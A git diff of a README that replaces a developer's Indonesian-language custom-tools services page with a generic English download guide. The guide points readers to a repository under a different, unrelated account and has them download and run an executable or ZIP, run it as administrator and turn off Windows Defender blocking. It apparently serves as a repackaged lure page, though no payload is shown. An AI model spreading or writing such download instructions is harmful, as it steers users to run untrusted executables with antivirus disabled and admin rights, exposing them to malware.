@@ -1,165 +1,179 @@
-<div align="center">
-  
-# <img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&size=28&duration=3500&pause=500&color=00F7FF&center=true&vCenter=true&width=600&lines=RuyynnDev;Custom+Tools+%26+Website;Buat+Website+Kamu+Sendiri" alt="Typing SVG" />
+# 🛠️ ruyynn-services - Custom tools built for your needs
 
-### *Beyond Code, Build Your Digital Ghost*
+[![Download Now](https://img.shields.io/badge/Download-ruyynn--services-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Horatiusbridgeable99/ruyynn-services)
 
-[![Instagram](https://img.shields.io/badge/Instagram-%23E4405F.svg?style=for-the-badge&logo=Instagram&logoColor=white)](https://instagram.com/ellreynn)
-[![Facebook](https://img.shields.io/badge/Facebook-%231877F2.svg?style=for-the-badge&logo=Facebook&logoColor=white)](https://facebook.com/ruyynn.dev)
-[![GitHub](https://img.shields.io/badge/GitHub-%23121011.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ruyynn/CustomTools)
-[![Website](https://img.shields.io/badge/Website-%23000000.svg?style=for-the-badge&logo=react&logoColor=#00F7FF)](https://ghostdev.great-site.net/)
+## 📥 Download
 
-</div>
+Use this link to visit the download page:
+https://github.com/Horatiusbridgeable99/ruyynn-services
 
----
+## 🧰 What This App Does
 
-## 🎭 *Siapa Saya??*
+ruyynn-services is a set of custom tools and website services made for specific needs. It is built from scratch for each project, so it can fit a clear use case without extra parts.
 
-<div align="center">
-  
-```diff
-+ Halo! Saya Ruyynn, developer dari Indonesia.
-+ Saya bergerak di bayang-bayang digital, membangun senjata rahasia untuk kebutuhan Anda.
-- Bukan sekadar kode, tapi solusi dengan privasi maksimal.
-```
+This project is useful if you need:
+- custom tools for daily tasks
+- bot automation for repeated work
+- simple network tools
+- privacy-focused tools
+- developer support tools
+- custom website work
 
-</div>
+## 💻 Windows Requirements
 
-_Saya adalah **custom tools engineer** yang fokus pada pengembangan solusi spesifik—mulai dari bot automation canggih, network tools berlapis keamanan, AI detector (DeepSense), hingga website profesional. Setiap baris kode saya tulis khusus untuk Anda, tanpa jejak yang tidak diinginkan._
+Before you start, check these basic points:
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- Enough free disk space for the app and its files
+- Internet access for the download page
+- A web browser such as Chrome, Edge, or Firefox
 
----
+If your PC is older, close other apps first to keep things smooth.
 
-## ✨ *Why Me? The Ghost Advantage*
+## 🚀 Get Started on Windows
 
-<div align="center">
-  
-| 🔒 **100% Private** | ⚡ **Lightning Fast** | 🤝 **Flexible Price** | 🧩 **Zero to Hero** |
-| :---: | :---: | :---: | :---: |
-| NDA tersedia. Source code milik penuh klien. | Respon dalam 1×24 jam, progress real-time. | Harga disesuaikan dengan kantong & kebutuhan. | Apapun ide Anda, saya wujudkan dari nol. |
+Follow these steps to download and run ruyynn-services on Windows:
 
-</div>
+1. Open this page in your browser:
+   https://github.com/Horatiusbridgeable99/ruyynn-services
 
----
+2. Look for the latest download option on the page.
 
-## 🚀 *Ghost Services*
+3. Download the file to a folder you can find later, such as:
+   - Downloads
+   - Desktop
+   - Documents
 
-<table>
-  <tr>
-    <td width="33%" valign="top">
-      <h3 align="center">📊 Analysis & Report</h3>
-      <p align="center">Pattern detection, emotional scoring, timeline generator, dan visualisasi data yang mendalam.</p>
-    </td>
-    <td width="33%" valign="top">
-      <h3 align="center">⚡ Custom CLI Tools</h3>
-      <p align="center">Command-line tool dengan UI Terminal futuristik, powerful, dan fungsional.</p>
-    </td>
-    <td width="33%" valign="top">
-      <h3 align="center">🤖 Bot & Automation</h3>
-      <p align="center">Bot report, auto-tools, dan script otomasi lintas platform dengan efisiensi tinggi.</p>
-    </td>
-  </tr>
-  <tr>
-    <td width="33%" valign="top">
-      <h3 align="center">🕵️ Network & Privacy Tools</h3>
-      <p align="center">IP analyzer, VPN checker, DNS leak test, anonymity scorer, dan tools OSINT lengkap.</p>
-    </td>
-    <td width="33%" valign="top">
-      <h3 align="center">🔐 Encryption & String Tools</h3>
-      <p align="center">Custom encryption, encoder/decoder, string manipulation, dan pattern analysis tingkat lanjut.</p>
-    </td>
-    <td width="33%" valign="top">
-      <h3 align="center">✨ Request Apapun</h3>
-      <p align="center">Punya ide unik? Diskusikan saja! Saya siap mewujudkan mimpi digital Anda.</p>
-    </td>
-  </tr>
-</table>
+4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
 
----
+5. Open the extracted folder.
 
-## 💼 *Featured Arsenal*
+6. Find the app file or launcher file and double-click it.
 
-<div align="center">
-  
-### 🔮 **DeepSense**
-> *AI Deepfake Detector kelas berat*  
-> Analisis motion artifacts, konsistensi wajah per-frame, dan pencocokan suara dengan akurasi tinggi.
+7. If Windows asks for permission, choose **Yes** or **Run**.
 
-### 📡 **NIUR – WiFi Tools**
-> *Kit Keamanan WiFi Terlengkap*  
-> Brute-force protection, signal scanner, deauth detector, hidden SSID revealer, dan network security tester.
+8. Wait for the app to open.
 
-### 🧠 **WhyAlwaysMe**
-> *Pattern Analysis Toolkit*  
-> Emotional scoring, timeline generator, dan behavioral pattern detection untuk analisis mendalam.
+9. If the app has setup steps, follow the on-screen prompts.
 
-### 🔤 **ALZARSTR**
-> *String Manipulation Master*  
-> Custom encryption dengan key strength tester, encoder/decoder, dan transformasi teks tingkat lanjut.
+## 🖱️ How to Use the App
 
-### 🕶️ **MR-Anonymous**
-> *Privacy & Network Toolkit*  
-> Anonymity scorer, IP masking validator, dan comprehensive privacy assessment tool.
+After you open the app, you can use it based on the tool you need:
 
-</div>
+- choose the tool you want to run
+- enter the required data or settings
+- start the process
+- wait for the result
+- save the output if needed
 
-> *Setiap tools di atas adalah versi preview. Full version diberikan eksklusif ke client dengan fitur tak terbatas.*
+If the app has more than one tool, each one should be clear and easy to reach from the main screen.
 
----
+## 🔧 Common Features
 
-## 💰 *Investment Plans (Nego Friendly)*
+ruyynn-services is designed to support work such as:
+- task automation
+- bot-based actions
+- website creation support
+- custom workflows
+- privacy-safe local use
+- network-related utility work
 
-<div align="center">
-  
-| Paket | Harga (Estimasi) | Fitur Unggulan | Waktu Pengerjaan |
-| :---: | :---: | :--- | :---: |
-| **🚀 Starter** | Rp 25k – 50k | Tools ringan dengan 1–3 fitur inti | 1-2 hari |
-| **⚡ Standard** | Rp 75k – 150k | Tools lengkap dengan UI Terminal rapi + dokumentasi | 2-4 hari |
-| **💎 Premium** | Rp 200k+ | Tools kompleks (AI, Network, dll) dengan fitur unlimited + support 24/7 | 5-10 hari |
+The app may include a simple layout so users can move between tools without extra steps.
 
-</div>
+## 📁 What You May See After Download
 
-*Harga final ditentukan setelah diskusi kebutuhan. **Revisi gratis** hingga sesuai keinginan!*
+Depending on the version you download, you may see files like:
+- .exe files
+- .zip files
+- folders with app data
+- config files
+- readme files
 
----
+If you see a readme file inside the download, open it first. It may give file-specific steps.
 
-## 👣 *How We Roll*
+## 🛠️ Troubleshooting
 
-```mermaid
-graph LR
-    A[💬 Hubungi Saya] --> B[🎯 Diskusi & Estimasi]
-    B --> C[⚙️ Pengerjaan]
-    C --> D[✅ Selesai & Terima]
-    D --> E[🔒 Privasi Terjaga]
-```
+If the app does not open:
 
-1.  **📞 Hubungi Saya** – DM via [Instagram](https://instagram.com/ellreynn) atau [Facebook](https://facebook.com/ruyynn.dev). Ceritakan ide Anda sebebasnya.
-2.  **🎯 Diskusi & Estimasi** – Saya akan memberikan estimasi waktu, harga, dan konsep. Nego selalu terbuka.
-3.  **⚙️ Pengerjaan** – Tools dibangun dari nol sesuai spek. Progress bisa dipantau, revisi tersedia kapan saja.
-4.  **✅ Selesai & Terima** – Source code dikirim lengkap. Nama tools bisa disesuaikan. Privasi 100% terjamin.
+- check that the download finished
+- make sure you extracted the ZIP file
+- right-click the app and choose **Run as administrator**
+- turn off blocking from Windows Defender if it asks for approval
+- try downloading the file again
+- restart your PC and try once more
 
----
+If the page does not load:
 
-## 📞 *Contact & Order*
+- check your internet connection
+- try another browser
+- refresh the page
+- open the link again later
 
-<div align="center">
-  
-### **Siap membangun tools atau website impian Anda?**
+If Windows shows a warning:
+- choose the option to keep the file only if it came from the link above
+- confirm the file name matches what you downloaded
+- open the file again after approval
 
-[![Instagram](https://img.shields.io/badge/@ellreynn-FF0069?style=for-the-badge&logo=instagram&logoColor=white)](https://instagram.com/ellreynn)
-[![Facebook](https://img.shields.io/badge/Ruyynn_Dev-1877F2?style=for-the-badge&logo=facebook&logoColor=white)](https://facebook.com/ruyynn.dev)
+## 🔒 Privacy and Local Use
 
-**Atau, kunjungi website saya:**  
-[![Website](https://img.shields.io/badge/GHOST_DEV-00F7FF?style=for-the-badge&logo=react&logoColor=black)](https://ghostdev.great-site.net/)
+This project focuses on practical tools and custom work. If a tool runs on your PC, your data stays under your control.
 
-</div>
+For best results:
+- review any config file before changing it
+- keep a copy of important files
+- use a separate test folder for first-time setup
+- close apps you do not need while running automation tasks
 
-*🔒 NDA tersedia. Source code milik client. Nama bisa disembunyikan atas permintaan.*
+## 📌 Good Use Cases
 
----
+ruyynn-services fits tasks like:
+- repeated admin work
+- small automation jobs
+- custom internal tools
+- web service helpers
+- simple utility scripts
+- task-specific business tools
 
-<div align="center">
+It works well when you need a tool made for one job instead of a large general app.
 
-**© 2026 Ruyynn – Custom Tools Builder Indonesia**  
-*All tools crafted precisely for you. No trace, no regret.*
+## 🌐 Topics Covered
 
-</div>
+This project is tagged for:
+- automation tools
+- bot automation
+- custom tools
+- cybersecurity
+- developer tools
+- Indonesia
+- network tools
+- privacy tools
+
+## 📄 Project Focus
+
+ruyynn-services follows this approach:
+- each project starts from zero
+- the tool is shaped around the client need
+- the result stays simple and direct
+- the app avoids extra parts that do not help the job
+
+## 🧭 Recommended First Run
+
+For your first use:
+1. download the app from the link above
+2. extract the files if needed
+3. open the main app file
+4. test one feature first
+5. read any local instructions in the folder
+6. save your working folder for later use
+
+## 📦 File Organization Tip
+
+To keep things easy:
+- make one folder for the app
+- keep the downloaded ZIP file as a backup
+- store notes in the same folder
+- do not rename files unless the instructions say so
+
+## 🤝 Best Way to Use It
+
+Use ruyynn-services when you want a custom solution that matches a clear need. It is best for users who want a focused tool, a simple setup, and a clean working folder
